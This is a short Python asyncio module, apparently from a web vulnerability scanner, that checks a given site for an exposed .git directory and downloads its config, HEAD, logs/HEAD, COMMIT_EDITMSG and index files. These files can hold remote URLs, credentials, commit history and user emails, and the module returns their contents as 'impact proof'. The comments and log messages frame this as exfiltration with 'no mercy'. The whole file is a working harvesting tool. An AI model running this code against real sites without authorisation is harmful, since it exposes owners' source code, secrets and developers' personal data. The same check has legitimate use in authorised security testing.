import aiohttp
import asyncio
import re

# ไฟล์สำคัญใน .git ที่บอกข้อมูลได้
GIT_FILES = {
    "config": "Repository Configuration (Remote URL/Creds)",
    "HEAD": "Current Branch Ref",
    "logs/HEAD": "Commit History & User Emails",
    "COMMIT_EDITMSG": "Last Commit Message",
    "index": "File Index (Binary)"
}

async def extract_git_file(session, base_url, filename, desc):
    target = f"{base_url}/.git/{filename}"
    try:
        async with session.get(target, timeout=10, ssl=False, allow_redirects=False) as resp:
            if resp.status == 200:
                content = await resp.text(errors='ignore') # ignore encoding errors for binary
                
                # กรอง HTML (Soft 404)
                if "<html" in content.lower(): return None
                
                # ถ้าเจอข้อมูลสำคัญ ให้ส่งกลับ
                if len(content) > 0:
                    return {
                        "file": filename,
                        "desc": desc,
                        "content": content
                    }
    except Exception: pass
    return None

async def run_git_extractor(target_url, log_callback=None, headers=None):
    findings = []
    # ลองเช็คแค่ Root URL ที่ User ให้มาก็พอ
    base_url = target_url.rstrip("/")
    
    # เช็คเบื้องต้นก่อนว่ามี .git ไหม
    async with aiohttp.ClientSession(headers=headers) as session:
        try:
            async with session.get(f"{base_url}/.git/HEAD", timeout=5, ssl=False) as resp:
                if resp.status != 200: return findings
        except Exception: return findings

        if log_callback: log_callback(f"🏴‍☠️ Exposed .git detected! Exfiltrating repository details...")

        # ถ้ามี ให้เริ่มดูดไฟล์
        tasks = []
        for fname, desc in GIT_FILES.items():
            tasks.append(extract_git_file(session, base_url, fname, desc))
            
        results = await asyncio.gather(*tasks)
        
        extracted_data = ""
        for res in results:
            if res:
                # [NO MERCY] โชว์เนื้อหาไฟล์ Config และ Logs แบบเต็มๆ
                extracted_data += f"--- FILE: .git/{res['file']} ({res['desc']}) ---\n"
                extracted_data += f"{res['content'][:1000]}\n\n" # ตัดที่ 1000 ตัวอักษรต่อไฟล์เพื่อไม่ให้ยาวเกินไป
                
        if extracted_data:
            findings.append({
                "type": "Git Repository Exposure (Full Takeover)",
                "severity": "Critical",
                "detail": "Successfully accessed internal git structure. Source code reconstruction possible.",
                "evidence": f"[IMPACT PROOF - GIT EXFILTRATION]\n{extracted_data}",
                "remediation": "Deny access to .git directory in web server config."
            })
            if log_callback: log_callback(f"🔥 GIT DATA EXTRACTED FROM {base_url}")

    return findings